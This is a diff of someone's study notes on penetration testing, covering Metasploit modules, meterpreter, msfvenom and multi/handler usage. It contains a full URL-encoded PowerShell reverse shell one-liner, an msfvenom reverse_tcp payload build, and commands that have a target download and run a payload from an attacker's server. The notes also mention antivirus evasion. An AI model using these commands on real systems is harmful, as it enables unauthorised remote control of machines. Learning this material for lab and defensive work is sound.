@@ -559,18 +559,180 @@ This repository documents my hands-on learning and notes in Vulnerability Assess
   
 		$ powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%27<IP>%27%2C<PORT>%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22
 
-# MSFVENOM:
+# VULNERABILITIES RESEARCH:
 
-	$ msfvenom -p <PAYLOAD> <OPTIONS>
+- Scoring Vulnerabilites:
+
+ 		 -> CVSS (Common Vulnerability Scoring System)
+
+ 		 -> VPR (Vulnerability Priority Rating)
+
+- Vulnerability Databases:
+
+  		-> NVD (National Vulnerability) - CVE - YEAR - IDNUMBER
+
+  		-> Exploit-DB - POC for exploitation to exploit specific vulnerability
+
+- Automated vs Manual Vulnerability Research:
+
+ 		 -> Nessus (primarily used for automated vulnerability research)
+
+  		-> Metasploit ( auxiliary module for scanning known signatures of a vulnerability)
+
+- Common Vulnerabilites:
+
+  		-> Security Misconfigurations
+
+  		-> Broken Access Control
+
+ 		 -> Insecure Deserialization
+
+ 		 -> Injection
+
+# METASPLOIT:
+
+- Main Components:
+
+		-> msfconsole
+
+		-> Modules
+
+  		-> Tools
+
+  		-> Vulnerability, Exploit, Payload
+
+- Modules:
+
+  		-> Auxiliary - Scanners, crawlers and fuzzers.
+
+  		-> Encoders - encode the exploit and payload to bypass signature-based antivirus solution.
+
+  		-> Evasion - will try to evade the antivirus with more or less success.
+
+  		-> Exploits - a piece of code which uses a vulnerability present on the target system.
+
+  		-> NOPs - No OPeration do nothing. Used as buffer to achieve consistent payload size.
+
+		-> Payloads - code that runs on the target system. Needed to achieve results on the target such as getting a shell, loading malware or backdoor.
+
+  		-> Post - final stage of penetration testing, post-exploitation.
+
+- Types of Payloads:
+
+  		-> Adapters: Wraps single payloads to convert them into different formats.
+
+  		-> Singles: Self-contained payloads
+
+  		-> Stagers: Sets up a connection channel between Metasploit and the target system.
+
+  		-> Stages: Downloaded by the stager after setting the stage by uploading a stager to the target system. The final payload sent will be relatively large than the first one.
+
+- Single vs Staged Payloads:
+
+  		-> generic/shell_reverse_tcp (inline/single)
+
+  		-> windows/x64/shell/reverse_tcp (staged)
+
+- msfconsole:
+
+  		> search type:exploit windows ms17-010
+
+   		> use * (any exploit you want to use based on the known vulnerability)
+
+		> info
+
+ 		> show options
+
+ 		> set PARAMETER_NAME VALUE
+
+  		> show payloads
+
+  		> setg / unsetg (set or unset the global variable)
+
+  		> exploit/run
+
+   		> exploit -z (runs the exploit and background the session)
+
+		> sessions (checks active sessions)
+
+ 		> session -i ID (interact with the desired session)
+
+## Meterpreter:
+
+- Metasploit payload basically a post-exploitation tool after obtaining a meterpreter shell of the target machine
+ 
+- runs in the memory of the target machine so it is hard to be detected during antivirus scans.
+ 
+- uses encrypted communications with the server where Metasploit runs.
+ 
+- Commands (meterpreter):
+
+  		> msfvenom --list payloads | grep meterpreter (depends which one to use by analyzing target operating system, components and the network connection type)
+
+  		> getpid
+
+   		> ps
+
+		> help
+
+ 		> search -f document.txt
+
+ 		> background, exit, guid, info, migrate, run, load and many more
+
+## MSFVENOM:
+
+- used to access all payloads available in the framework and allows to create payloads in different format to the attacker need or the vulnerable machine.
+
+		$ msfvenom -l payloads
+
+		$ msfvenom -p <PAYLOAD> <OPTIONS>
 	
-	$ msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>
+		$ msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>
 	        {<OS>/<arch>/<payload>}
 			
-	$ shell_reverse_tcp (stageless payload)
+		$ shell_reverse_tcp (stageless payload)
 	
-	$ shell/reverse_tcp (staged payload)
+		$ shell/reverse_tcp (staged payload)
 	
-	$ metasploit multi/handler (used for staged payload)
+		$ metasploit multi/handler (used for staged payload)
+
+## Multi Handler:
+
+- used to receive incoming connection.
+
+  		> use exploit/multi/handler
+
+   		> show options (change what needs to be changed)
+
+		> set LHOST ATTACKIN_MACHINE_IP LPORT WHAT WE USED WHEN CREATING THE MSFVENOM PAYLOAD
+
+  		> set payload USED IN MSFVENOM PAYLOAD
+
+		> run
+
+- Use of MsfVenom and Multihandler:
+
+  - create customised payload of an exploit and give permission to the file to be edited (chmod +x)
+    
+  - host a python server on the attacking machine
+    
+    	$ python3 -m http.server 9000/shell.elf
+  
+  - use the compromised target machine to download the files from the python web server
+
+		$ wget http://ATTACKING_MACHINE_IP:9000/shell.elf
+
+		$ chmod +x shell.elf
+
+		$ ./shell.elf
+
+	- now what the multi handler does is capture the payload msfVenom created and the one target machine just executed and automatically loads a meterpreter shell on the msfconsole.
+ 
+  	- this staged payload requires different tabs to be open, one for connecting to the target machine using ssh or any known methods, two for msfvenom to generate payload and host a python server and third one to listen to the upcoming payload that msfvenom created that was ran on the target machine.
+
+* This is for LINUX target machine. For windows also it is the same but the command to download the payload from the attacker server is different and execution of the file is also different.
+ 
+     
 
 
 
